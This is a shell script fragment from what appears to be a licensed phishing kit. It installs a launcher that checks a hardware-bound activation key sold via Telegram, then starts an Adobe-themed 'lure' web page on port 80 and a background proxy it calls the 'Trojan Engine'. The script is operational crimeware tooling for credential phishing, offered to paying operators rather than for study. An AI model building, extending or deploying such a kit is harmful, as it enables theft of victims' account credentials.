# --- 7. THE "PERMANENT BRANDING" RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
# --- COLORS ---
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
SECRET_SALT="MY_PRIVATE_PHRASE_2026"
VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')

# --- ALWAYS SHOW THE TROJANPAGE FIRST ---
clear
echo -e "${BLUE}"
echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
echo -e "${NC}"
echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
echo " ----------------------------------------------------------------------------------"
echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"

# --- NOW CHECK THE LICENSE ---
if [ -f "$LICENSE_FILE" ]; then
    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
        # CALCULATE DAYS LEFT
        DAYS_LEFT=$(( ($EXPIRY_DATE - $CURRENT_DATE) / 86400 ))
        echo -e "${GREEN}[success] License Active ($DAYS_LEFT Days Remaining).${NC}"
        echo " ----------------------------------------------------------------------------------"
        
        # START ENGINE
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill proxy && pkill php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
        echo -e "${BLUE}[!] Trojan Engine is now running in the background.${NC}"
        exit 0
    else
        echo -e "${RED}[!] 3-MONTH LICENSE EXPIRED. REACTIVATION REQUIRED.${NC}"
        rm "$LICENSE_FILE"
    fi
fi

# --- IF NO LICENSE OR EXPIRED, SHOW THE UNAUTHORIZED BOX ---
echo -e "${RED}[error] $(date +%H:%M:%S) received status 401 Unauthorized.${NC}"
echo -e "${BLUE}[important] Send HWID to @YourUsername on TG for Activation.${NC}"
echo " ----------------------------------------------------------------------------------"

read -p "ENTER ACTIVATION KEY: " USER_KEY

if [ "$USER_KEY" == "$VALID_KEY" ]; then
    EXPIRY=$(($CURRENT_DATE + 7776000))
    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
    echo -e "${GREEN}[success] Activated! Valid for 90 days.${NC}"
    sleep 1
    /root/run.sh # Restart to trigger the active license flow
else
    echo -e "${RED}[error] Invalid Activation Key.${NC}"
    exit 1
fi
EOF
chmod +x /root/run.sh
